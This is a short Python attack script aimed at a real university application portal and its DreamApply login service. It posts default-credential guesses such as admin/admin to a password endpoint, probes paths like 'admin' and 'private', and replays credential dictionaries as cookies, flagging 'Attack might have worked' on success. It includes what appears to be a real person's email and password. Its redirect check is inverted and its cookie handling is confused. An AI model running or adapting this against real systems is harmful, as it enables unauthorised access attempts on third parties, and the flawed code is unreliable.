import requests

def send_post_requests(base_url, data_list):
    print("\n--- POST Requests ---")
    for data in data_list:
        try:
            response = requests.post(base_url, data=data)
            print(f"POST to {base_url} with data: {data}")
            print(f"Status Code: {response.status_code}")
            print("Important Headers:")
            print(f"  Server: {response.headers.get('Server', 'Not provided')}")
            print(f"  Content-Type: {response.headers.get('Content-Type', 'Not provided')}")
            print(f"  X-Content-Type-Options: {response.headers.get('X-Content-Type-Options', 'Not provided')}")
            print(f"  X-Frame-Options: {response.headers.get('X-Frame-Options', 'Not provided')}")
            print(f"  Strict-Transport-Security: {response.headers.get('Strict-Transport-Security', 'Not provided')}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

def send_get_requests_with_redirect(base_url, paths_list):
    print("\n--- GET Requests with Redirections ---")
    for path in paths_list:
        full_url = f"{base_url}{path}"
        try:
            response = requests.get(full_url, allow_redirects=True)
            final_url = response.url
            print(f"GET to {full_url}")
            print(f"    Status Code: {response.status_code}")
            if final_url == base_url:
                print(f"    Redirection to : {final_url}")
            else:
                print("     No redirection")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

def manage_cookies(base_url, cookies_list):
    print("\n--- Requests with Cookies ---")
    for cookies in cookies_list:
        try:
            session = requests.Session()
            session.cookies.update(cookies)
            response = session.get(base_url)
            print(f"GET to {base_url} with cookies: {str(cookies).replace(cookies.get('sessionid', 'xxxxx'), 'xxxxx')}")

            # Check if the response indicates a successful attack (access to restricted area, no redirection, etc.)
            print(f"Status Code: {response.status_code}")

            if response.status_code == 200:
                print("Access to page succeeded. Attack might have worked.")
            elif response.status_code == 401:
                print("Unauthorized access. Cookies are invalid.")
            elif response.status_code == 302:
                print("Redirected. Check if redirection goes to a login page or sensitive page.")
            else:
                print(f"Unexpected status code: {response.status_code}")

            # Look at Set-Cookie headers for any session changes
            set_cookie_header = response.headers.get('Set-Cookie', None)
            if set_cookie_header:
                print(f"Set-Cookie header received: {set_cookie_header}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    base_url = "https://apply.vu.lt/"
    apply_url = "https://id.dreamapply.com/login"
    connexion_list = [
        {"email": "vlg.aurelien@gmail.com", "password": "aurelien"},
        {"email": "user@gmail.com", "password": "user"},
        {"email": "admin@gmail.com", "password": "admin"},
        {"email": "test@gmail.com", "password": "test"},
        {"email": "guest@gmail.com", "password": "guest"}
    ]
    paths_list = ["admin","login","private","wordpress","pannel"]
    # 1. Post data

    send_post_requests(apply_url+"/password", connexion_list)
    
    # 2. GET redirection

    send_get_requests_with_redirect(base_url, paths_list)
    
    # 3. Anonymized cookies for requests
    manage_cookies(apply_url, connexion_list)
